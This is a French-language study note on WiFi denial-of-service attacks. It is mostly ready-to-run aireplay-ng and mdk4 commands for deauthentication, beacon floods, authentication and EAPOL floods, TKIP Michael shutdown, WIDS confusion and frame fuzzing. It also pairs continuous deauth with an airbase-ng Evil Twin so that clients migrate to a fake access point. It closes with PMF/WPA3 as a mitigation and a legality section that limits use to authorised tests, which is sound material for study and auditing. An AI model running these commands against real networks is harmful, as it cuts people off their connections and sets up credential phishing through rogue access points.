---
title: "DoS WiFi et MDK4"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Networking > Network Security > WiFi"
tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, dos, deauth, mdk4, mdk3]
date: "2026-05-17"
---

# DoS WiFi et MDK4

Les trames management 802.11 ne sont pas authentifiées par défaut → un attaquant peut injecter deauth, beacon, probe, etc. **PMF (802.11w)** corrige le problème (obligatoire en WPA3, optionnel en WPA2).

## Deauthentication classique — aireplay-ng

```bash
# Deauth broadcast (tous les clients d'un AP)
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# 0 = en continu (DoS)

# Cibler un client précis (plus efficace, moins bruyant)
aireplay-ng --deauth 100 -a AP_MAC -c CLIENT_MAC wlan0mon

# Combiné avec capture de handshake (autre terminal)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w hs wlan0mon
```

| Flag | Rôle |
|------|------|
| `--deauth N` | N paquets (0 = boucle infinie) |
| `-a` | BSSID de l'AP |
| `-c` | MAC client précis (sinon broadcast) |
| `--ignore-negative-one` | Force l'envoi malgré canal "désynchro" |

## mdk4 — le couteau suisse DoS

`mdk4` (successeur de mdk3) regroupe une dizaine d'attaques 802.11. Syntaxe : `mdk4 <interface> <mode> [options]`.

| Mode | Nom | Effet |
|------|-----|-------|
| `b` | Beacon flood | Inonde l'environnement de faux APs |
| `a` | Auth DoS | Sature un AP de tentatives d'auth |
| `d` | Deauth/disassoc | Deauth en masse (mieux qu'aireplay) |
| `p` | Probe / SSID brute | Brute-force SSID caché, probe flood |
| `m` | Michael shutdown | DoS spécifique TKIP (WPA-TKIP) |
| `e` | EAPOL flood | DoS sur APs Enterprise |
| `s` | Mesh attack | Cible 802.11s |
| `w` | WIDS confusion | Confond les IDS (faux roaming entre APs) |
| `f` | Packet fuzzer | Test de robustesse drivers |

### Mode b — Beacon Flood

Sature l'air avec des centaines de faux SSIDs → pollue la liste de réseaux des victimes, masque des APs légitimes.

```bash
# Beacon flood avec SSIDs aléatoires (encodage WPA2)
mdk4 wlan0mon b -n RandomSSID -g -w 2 -c 6
# -n  base name (RandomSSID01, RandomSSID02...)
# -g  802.11g (54 Mbps)
# -w 2 chiffrement WPA2 affiché
# -c  canal

# Avec fichier de SSIDs
mdk4 wlan0mon b -f ssids.txt -s 100 -c 6
# -f fichier de SSIDs
# -s 100 paquets/seconde

# Beacon flood pour imiter un opérateur (utile en social engineering)
echo -e "Bbox-MAISON\nLivebox-FREE\nSFR-WiFi" > fakes.txt
mdk4 wlan0mon b -f fakes.txt -c 6
```

### Mode a — Auth DoS

Inonde un AP de demandes d'authentification → l'AP épuise sa table de clients et refuse les connexions légitimes.

```bash
# Auth DoS sur un AP précis
mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF -s 1000
# -a AP cible
# -s pps (paquets/sec)

# Auth DoS sur tous les APs visibles (test stress)
mdk4 wlan0mon a -i wlan0mon

# Mode "intelligent" : maintient les associations
mdk4 wlan0mon a -m -a AP_MAC
```

### Mode d — Deauth amélioré

Comparable à aireplay mais avec **liste blanche/noire** et meilleurs flags.

```bash
# Deauth de tous les clients sauf certains
echo "AA:BB:CC:DD:EE:FF" > whitelist.txt   # ne PAS deauth ceux-ci
mdk4 wlan0mon d -w whitelist.txt -c 6

# Deauth uniquement certains clients
echo "11:22:33:44:55:66" > blacklist.txt
mdk4 wlan0mon d -b blacklist.txt -c 6

# Sur plusieurs canaux (hopping)
mdk4 wlan0mon d -b blacklist.txt -c 1,6,11

# Combiné avec capture (autre terminal)
airodump-ng -c 6 --bssid AP_MAC -w hs wlan0mon
mdk4 wlan0mon d -B AP_MAC -c 6              # -B = cible un AP entier
```

### Mode p — Probe / SSID brute-force

Brute-force d'un SSID caché par probes successives.

```bash
# Brute-force SSID (utile si l'ESSID est masqué)
mdk4 wlan0mon p -t AA:BB:CC:DD:EE:FF -f ssidlist.txt

# Probe flood (génère du bruit pour saturer un WIDS)
mdk4 wlan0mon p -e MaisonBox -t AA:BB:CC:DD:EE:FF
```

### Mode m — Michael shutdown (TKIP)

Exploite le **Michael MIC failure countermeasure** : si un AP TKIP reçoit 2 trames avec MIC invalides en 60s, il **se coupe 60s**. En envoyant régulièrement des trames forgées → DoS permanent.

```bash
# DoS sur AP WPA-TKIP
mdk4 wlan0mon m -t AA:BB:CC:DD:EE:FF -j -w 1 -s 2

# N'affecte que WPA-TKIP (pas WPA2-CCMP/AES)
```

### Mode e — EAPOL flood

Cible WPA2-Enterprise : sature le serveur RADIUS de demandes EAPOL.

```bash
mdk4 wlan0mon e -t AA:BB:CC:DD:EE:FF -c 6
```

### Mode w — WIDS confusion

Simule du **roaming** : déconnecte/reconnecte des clients entre plusieurs APs pour saturer un WIDS d'alertes.

```bash
mdk4 wlan0mon w -c 6 -z          # -z = mode "zero" (random)
```

### Mode f — Fuzzer

Envoie des trames malformées pour tester la robustesse des drivers/firmwares.

```bash
mdk4 wlan0mon f -t AA:BB:CC:DD:EE:FF
# Peut crasher des AP/clients buggés (utile en audit hardware)
```

## Combinaison classique : Evil Twin + DoS continu

```bash
# Terminal 1 : DoS sur la vraie AP
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6

# Terminal 2 : faux AP (même SSID)
airbase-ng -e "MaisonBox" -c 6 wlan1mon

# Les clients déconnectés du vrai AP migrent vers le faux
```

→ Voir [[05 - Evil Twin et Phishing]] pour le workflow complet.

## Limites avec PMF (802.11w)

```bash
# Sur un AP avec PMF activé :
aireplay-ng --deauth 5 -a AP_MAC -c CLIENT wlan0mon
# → les clients ignorent les deauth (signature MIC absente)
```

**Détecter PMF dans airodump-ng** :
```
ENC    CIPHER    AUTH    ESSID
WPA2   CCMP      PSK MFP MaisonBox      ← MFP = Management Frame Protection
WPA3   CCMP      SAE     MaisonBox-NG   ← WPA3 = PMF obligatoire
```

WPA3 → deauth inopérante. WPA2 sans MFP → deauth fonctionne.

## Légalité

Les attaques DoS WiFi sont illégales dans la plupart des juridictions, **même sur des réseaux ouverts**. Aux US la FCC a sanctionné des hôtels Marriott à 600 k$ pour deauth de hotspots personnels. En France : article 323-2 du Code pénal (entrave d'un STAD).

À n'utiliser que sur :
- son propre matériel
- des engagements pentest avec autorisation écrite
- CTF / labs isolés (HackTheBox, OffSec)

## Voir aussi

- [[03 - Attaques WPA2-PSK]] — deauth comme catalyseur du handshake
- [[05 - Evil Twin et Phishing]] — DoS + AP rogue
- [[09 - WPA3 et Vulnérabilités Modernes]] — PMF et limites
- [[11 - Defense et Detection]] — activer PMF et WIDS
